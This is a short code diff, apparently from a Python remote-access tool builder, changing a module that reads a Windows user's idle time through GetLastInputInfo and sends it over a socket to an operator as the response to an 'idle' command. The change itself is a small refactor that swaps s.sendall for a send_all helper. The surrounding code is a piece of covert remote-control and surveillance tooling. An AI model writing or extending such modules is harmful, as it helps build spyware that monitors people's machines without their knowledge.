@@ -18,7 +18,7 @@ def idle(data):
     lastInputInfo.cbSize = sizeof(lastInputInfo)
     windll.user32.GetLastInputInfo(byref(lastInputInfo))
     millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
-    s.sendall(('[+]User has been inactive for : ' + str(millis / 1000.0) + ' seconds').encode())''')
+    send_all(s,'[+]User has been inactive for : ' + str(millis / 1000.0) + ' seconds')''')
         config.logics.append('''
             elif command == "idle":
                 idle(data)''')
